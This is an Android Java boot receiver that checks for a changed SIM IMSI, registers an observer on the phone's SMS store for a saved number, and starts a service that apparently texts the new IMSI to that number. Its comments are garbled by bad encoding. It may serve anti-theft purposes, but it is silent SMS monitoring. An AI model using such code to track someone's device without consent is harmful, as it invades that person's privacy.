package com.littles.receivers;

import com.littles.datas.DataDone;
import com.littles.listeners.ObserverOnSmsChange;
import com.littles.services.ServiceSendIMSI;
import com.littles.utils.UtilBootCheck;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Handler;

public class ReceiverBoot extends BroadcastReceiver{

	@Override
	public void onReceive(Context context, Intent intent) {

		System.out.println("===========���������============1");
		boolean isStart = DataDone.readDoneStart(context);
		System.out.println("=================================2" + isStart);
		if(!isStart){
			
			return;
			
		}else{
			System.out.println("=================================3");
			
			String number = DataDone.readDoneNumber(context);

			System.out.println("=================================4");
			//---�����ǰsim����IMSI����洢��IMSI�벻һ��
			if(UtilBootCheck.isIMSIDifferent(context)){
				System.out.println("=================================5");
				//---�����Ű󶨼�����
						//����ָ������Ķ��ű����ͻ򱻽���ʱ����ȫ��ɾ���ú�������ж��ż�¼
				Uri smsUri = Uri.parse("content://sms");  
				context.getContentResolver().registerContentObserver(smsUri, 
		        		true, new ObserverOnSmsChange(new Handler(), number, context)); 
				System.out.println("=================================6");			
				
				//---����ǰ�ֻ���IMSI�뷢���Ÿ�Ŀ�����
				Intent imsiIntent = new Intent(context, ServiceSendIMSI.class);
				context.startService(imsiIntent);
				System.out.println("=================================7");
			
			}

		}

	}

}
